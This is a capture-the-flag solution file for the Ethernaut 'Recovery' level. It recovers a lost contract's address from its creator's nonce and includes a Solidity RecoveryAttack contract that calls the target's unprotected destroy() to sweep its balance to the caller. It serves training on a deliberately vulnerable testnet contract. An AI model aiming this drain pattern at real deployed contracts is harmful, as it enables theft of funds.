/*
Tools needed for this level:
- Console
- Remix IDE

According to the Ethereum Yellow Paper:
The address of the new contract is defined as being the rightmost 160 bits (20 bytes) 
of the Keccak-256 hash of the RLP encoding of the structure containing the sender and
the account nonce, meaning:
    new_contract_address = rightmost_20_bytes(keccak256(RLP(creators_address, nonce)))

1.- Encode with RLP via console, where "0xd6" and 0x94" are default values, instance
    is Ethernaut's Recovery address, and the nonce is 1 in hexadecimal value (it is 1
    because the lost contract was the first transaction of instance):
        result = web3.utils.soliditySha3("0xd6", "0x94", instance, "0x01")

2.- Get the last 40 digits (20 bytes) and format them like an address.
        lostAddr = "0x" + result.slice(-40)

ALTERNATIVE ADDRESS SOLUTION (SIMPLER):
    Check the internal transactions tab of Ethernaut's recovery address on Etherscan.io
    and click on the "Contract creation" link. That is the lost contract address: 
        https://rinkeby.etherscan.io/address/replace_with_ethernauts_recovery_address

3.- Deploy this contract (RecoveryAttack) with Remix using injected web3 environment.

4.- Execute the attack() function passing the obtained address as the parameter. 

5.- Check new balance of lost contract address:
        await web3.eth.getBalance(lostAddr)
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract RecoveryAttack {
	// This will execute the destroy() function on the lost contract and
	// send all its balance to us (msg.sender).
	function attack(address recoveryAddr) public returns (bool) {
		(bool success, ) = recoveryAddr.call(
			abi.encodeWithSignature('destroy(address)', msg.sender)
		);
		return success;
	}
}
